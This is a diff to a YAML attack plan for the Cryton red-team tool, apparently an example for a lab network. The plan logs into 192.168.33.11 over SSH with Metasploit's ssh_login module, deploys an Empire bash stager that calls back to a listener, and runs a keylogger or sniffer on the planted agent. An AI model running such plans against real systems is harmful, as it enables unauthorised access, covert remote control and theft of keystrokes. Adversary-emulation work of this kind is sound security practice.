@@ -8,6 +8,7 @@ plan:
       seconds: 5
     steps:
     - name: ssh-session
+      is_init: true
       step_type: cryton/execute-on-worker
       arguments:
         create_named_session: session_to_target_1
@@ -16,8 +17,8 @@ plan:
           exploit: auxiliary/scanner/ssh/ssh_login
           exploit_arguments:
             RHOSTS: 192.168.33.11
-            USERNAME: $parent.username
-            PASSWORD: $parent.password
+            USERNAME: username
+            PASSWORD: password
       next:
         - type: result
           value: OK
@@ -27,11 +28,10 @@ plan:
       arguments:
         use_named_session: session_to_target_1 # using named session created in step ssh-session
         stager_arguments:
-          os_type: linux
           listener_name: testing
           listener_port: 80
           stager_type: multi/bash
-          agent_name: MyAgent # only lower/upper characters and number allowed in name
+          agent_name: MyAgent # only lower/upper characters and numbers allowed in name
       next:
         - type: result
           value: OK
@@ -44,8 +44,8 @@ plan:
       next:
         - type: result
           value: OK
-          step: keylogger-on-agent
-    - name: keylogger-on-agent
+          step: sniffer-on-agent
+    - name: sniffer-on-agent
       step_type: empire/execute-on-agent
       arguments:
         use_agent: MyAgent
